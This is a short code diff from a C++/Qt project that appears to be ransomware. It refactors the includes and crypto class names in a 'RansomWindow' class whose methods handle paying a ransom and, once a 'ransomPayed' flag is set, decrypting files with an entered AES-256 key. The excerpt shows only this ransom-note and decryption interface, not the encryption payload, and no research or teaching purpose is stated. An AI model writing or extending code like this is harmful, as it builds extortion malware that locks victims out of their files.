@@ -4,10 +4,8 @@
 
 #include <MainWindow.h>
 #include <QMessageBox>
-#include <CryptoAes256.h>
-#include <KeyUtils.h>
+#include "../Cryptography/KeyGeneration.h"
 #include <QCoreApplication>
-#include "decryptor.h"
 
 void RansomWindow::payRansom() {
   QMessageBox::information(nullptr,
@@ -19,8 +17,8 @@ void RansomWindow::payRansom() {
 
 void RansomWindow::startDecryption() {
   if (ransomPayed) {
-    CryptoAes256 cryptoAes256;
-    KeyUtils keyUtils;
+    AES256 cryptoAes256;
+    KeyGeneration keyUtils;
     KeyIvAES keyIvAes;
 
     QString keyText = keyInputLineEdit->toPlainText();
